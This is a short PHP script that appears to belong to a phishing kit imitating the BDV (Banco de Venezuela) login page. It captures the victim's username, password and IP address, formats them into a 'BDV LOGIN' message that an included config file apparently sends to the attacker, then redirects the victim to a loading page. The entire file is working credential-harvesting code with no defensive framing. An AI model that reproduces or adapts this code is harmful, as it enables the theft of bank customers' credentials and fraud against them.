<?php  
session_start();
$_SESSION['passinput'] = $_POST['passinput'];
if (isset($_POST['login'])) {
	$enviara =
        "<b>➖➖➖ [ BDV LOGIN ] ➖➖➖</b>\n\n".
        "<b> 🌐Direccion IP: </b> ".getenv('REMOTE_ADDR')."\n".
        "<b> Usuario: </b> <code>".$_SESSION['usern']."</code>\n".
        "<b> Contraseña: </b> <code>".$_SESSION['passinput']."</code>\n";
		$enviar =  urldecode($enviara);
		include 'config/function.php';

		header("location: carga.html");
}
?>	